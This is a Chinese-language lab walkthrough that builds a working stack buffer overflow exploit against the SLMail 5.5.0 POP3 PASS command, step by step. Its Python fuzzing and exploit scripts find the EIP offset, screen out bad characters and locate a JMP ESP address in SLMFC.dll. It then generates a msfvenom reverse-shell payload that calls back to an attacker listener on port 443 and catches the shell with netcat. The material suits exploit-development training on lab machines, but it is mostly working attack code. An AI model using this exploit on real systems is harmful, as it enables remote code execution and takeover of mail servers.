以SLMail为例(版本5.5.0)
# 创建脚本，测试缓冲区
```
pop3-pass-fuzz.py
#!/usr/bin/python
# -*- encoding: utf-8 -*-
import socket

#创建一个缓冲区数组，同时递增它们。

buffer=["A"]
counter=100
while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter=counter+200

for string in buffer:
    print "Fuzzing PASS with %s bytes"%len(string)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect(('192.168.30.35',110))
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')
    s.close()
```


- 以管理员权限运行SLMail和Immunity Debugger
- Attach-SLMail
- 更改设置:右击-Appearance-font(all)-OEM fixed font   下方右击-Hex-Hex/ASCII(16bytes)

- 点击上方开始按钮后,在kail机运行脚本:    python pop3-pass-fuzz.py
- debugger显示 access violation when executing [41414141]-use Shift+F7/F8/F9 to pass exception to program 时,记录下此时的字节数   观察EBP和EIP的值,已被A(41)填充
- 在ESP上右击Follow in Dump,跳到内存查看


- 关闭debugger,重启slmail服务

# 根据测试结果改写脚本测试
```slmail-pop3.py
#!/usr/bin/python
# -*- encoding: utf-8 -*-

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'A' * 2700

try:
    print "\nSending evil buffer..."
    s.connect(('192.168.30.35',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"
```
- 打开Immunity Debugger   Attach-SLMail,开始
- 在kail机运行:   python slmail-pop3.py
- 出现提示信息后,此时EIP也被A填充

- /usr/share/metasploit-framework/tools/exploit/pattern_create.rb
- 使用msf-pattern_create模块,生成2700个字节的字符串: 
```
   msf-pattern_create -l 2700
```
- 用生成的字符串去替换slmail-pop3.py脚本的buffer参数

- 重启slmail服务和debugger,   python slmail-pop3.py

- 读出EIP的填充值,去生成的字符串中检索:   msf-pattern_offset 39694438    [例:]   Exact match at offset 2606

- 将slmail-pop3.py的buffer替换成:     buffer = "A" * 2606 + "B" * 4 + "C" * (2700-2606-4)
- 重启slmail服务和debugger,   python slmail-pop3.py
- 可以观察到,EIP的值已被B(42)填充

# 测试注入长度
- 通常shellcode包含350-400个字节
- 重启slmail服务和debugger,
- 将slmail-pop3.py的buffer替换成:     buffer = "A" * 2606 + "B" * 4 + "C" * (3500-2606-4)
- python slmail-pop3.py   观察到EIP仍被B填充,对ESP进行Follow in Dump,发现其已被填充成C(43)
- 算出此时栈中能利用的最大字节数: 0xA2D0 - 0xA128 = 0x1A8 = 424


- 发送从0x00-0xff字符来找出bad char，通常情况下,0x00都是bad char
重启slmail服务和debugger,修改脚本如下
```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = "A" * 2606 + "B" * 4 + badchars
```
- python slmail-pop3.py,  follow esp in dump
- 找出其中一个bad char之后,修改badchars变量,继续测试:     重启slmail服务和debugger,   python slmail-pop3.py,  follow esp in dump  重复上述步骤,直到找出所有的bad chars


- 下载mona,  https://github.com/corelan/mona  将mona.py拖放到"PyCommands"文件夹中(在Immunity Debugger应用程序文件夹中)。在c:\python27中安装Python 2.7.14（或更高版本的2.7.xx），从而覆盖与Immunity捆绑在一起的版本。尝试更新mona时需要这样做以避免TLS问题。确保正确安装32位版本的python。
- !mona modules   查看所有的模块
- 其中Rebase表示重启后是否会改变地址,False即不改变;SafeSEH、ASLR、NXCompat这三项都是Windows相关的安全机制;OS Dll表示是否是OS自带的库；即前四列选False，最后一列选True
- 切换到上方的m模块,继续筛选出有执行权限的dll
- 依次对满足上述条件的dll查找是否存在所需指令:
- 右击-Search for-command-jmp esp
- 右击-Search for-Sequence of commands-push esp retn
- 上方切换到c页面,没有任何内容(通常情况下会有)
- 调用msf中的模块,找该命令对应的十六进制数:
```
msf-nasm_shell
nasm > jmp esp
00000000 FFE4                       jmp esp
```
- 对每个找到的dll执行:    !mona find -s "\xff\xe4" -m xxx.dll
- 确定对应的模块:  C:\windows\system32\SLMFC.dll
- 点上方的e,会显示所有被slmail.exe加载的dll文件,找到SLMFC.dll后,双击,加载成功后,上方标题栏会变成[thread xxxxx,module SLMFC]
- 上方切换到k模块,在下方输入:     !mona find -s "\xff\xe4" -m slmfc.dll
- 在找到的结果中,筛选bad char没有的项
- 点击上方最右边蓝色的向右箭头-输入内存地址-跳到内存地址后-右击-copy to clipnoard-address(5F4A358F)
- 修改py脚本:     buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * (3500-2606-4)
- 重启slmail服务和debugger,跳到(5F4A358F)内存处,F2设置断点
- python slmail-pop3.py,可以观察到此时程序停在了(5F4A358F)处，右击follow esp in dump,查看栈中的数据
- F7单步调试,进入jmp esp中,观察到程序执行的代码段,全是C


- 重启slmail服务和debugger,使用msfvenom生成shell code payload:
- msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d"(找到的bad char) -e x86/shikata_ga_nai
- 会得到一串shell code: unsigned char buf[] = "xxxx..."
- 修改py脚本
```
shellcode = ("xxx...")

# \x90指的是nop,这里填写16个字节是为了容错,防止ESP寄存器起始的字节丢失而造成shellcode不能正常执行的情况。

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C" * (3500-2606-4-351-16)
```
- 在jmp esp的内存地址处F2设置断点,python slmail-pop3.py,在断点处F7进行单步调试,把第八个nop处的值修改成int3(函数中断),然后F7继续执行,到循环处,观察内存中的shell code解码,在CLD处F2添加断点,观察全部解码后的内存空间
- 在kail机进行侦听:   nc -lvp 443     可以看到有回弹shell连接过来     exit

- 重启slmail服务和debugger,
- nc -nvlp 443
- python slmail-pop3.py
- exit
- 此时 nc -v 192.168.30.5 110 发现拒绝连接,说明该服务已未响应
